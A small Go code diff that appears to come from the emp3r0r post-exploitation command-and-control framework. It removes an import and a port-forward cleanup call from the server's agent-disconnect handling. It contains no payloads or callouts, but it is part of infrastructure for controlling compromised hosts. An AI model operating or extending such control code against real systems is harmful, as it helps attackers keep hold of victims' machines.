@@ -12,7 +12,6 @@ import (
 
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
@@ -47,7 +46,6 @@ func handleMessageTunnelStream(secureConn *transport.SecureConn, dec *cbor.Decod
 			if endErr := agents.EndSession(t.UUID); endErr != nil {
 				logging.Debugf("handleMessageTunnel: end session for %s failed: %v", strconv.Quote(t.UUID), endErr)
 			}
-			controllers.CleanupPortFwdsByAgent(t)
 			operatorBroadcastPrintf(logging.ERROR, "Agent dies... %s is disconnected", strconv.Quote(t.Name))
 		}
 		_ = secureConn.Close()
